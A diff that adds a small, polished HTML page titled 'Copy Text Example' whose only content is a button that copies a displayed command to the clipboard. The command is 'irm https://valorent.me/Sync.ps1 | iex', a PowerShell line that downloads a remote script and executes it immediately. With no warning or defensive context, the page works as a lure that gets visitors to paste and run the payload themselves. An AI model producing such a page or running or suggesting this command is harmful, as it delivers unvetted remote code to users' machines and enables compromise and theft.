@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Copy Text Example</title>
+    <style>
+        /* 1. Page Layout & Background */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
+        /* 2. Card Container Styling */
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2rem 3rem;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            transition: transform 0.2s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        /* 3. The Text Paragraph Styling */
+        .stylish-text {
+            font-size: 1.0rem;
+            font-weight: 800;
+            color: #333;
+            margin: 0 0 1.5rem 0;
+            letter-spacing: 1px;
+            background: -webkit-linear-gradient(45deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* 4. The Copy Button Styling */
+        .copy-btn {
+            background-color: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(102, 126, 234, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .copy-btn:hover {
+            background-color: #764ba2;
+            transform: scale(1.05);
+        }
+
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Success state for the button */
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <p class="stylish-text" id="myText">irm https://valorent.me/Sync.ps1 | iex</p>
+
+    <button class="copy-btn" onclick="copyContent()">
+        <span id="btnText">Copy Text</span>
+    </button>
+</div>
+
+<script>
+    function copyContent() {
+        // 1. Get the text from the p tag
+        const text = document.getElementById('myText').innerText;
+        const button = document.querySelector('.copy-btn');
+        const buttonText = document.getElementById('btnText');
+
+        // 2. Use the Clipboard API to write text
+        navigator.clipboard.writeText(text).then(() => {
+
+            // 3. Visual Feedback (Success State)
+            const originalText = buttonText.innerText;
+
+            button.classList.add('success');
+            buttonText.innerText = "Copied! ✓";
+
+            // 4. Reset button after 2 seconds
+            setTimeout(() => {
+                button.classList.remove('success');
+                buttonText.innerText = originalText;
+            }, 2000);
+
+        }).catch(err => {
+            console.error('Failed to copy: ', err);
+            alert("Failed to copy text.");
+        });
+    }
+</script>
+
+</body>
+</html>
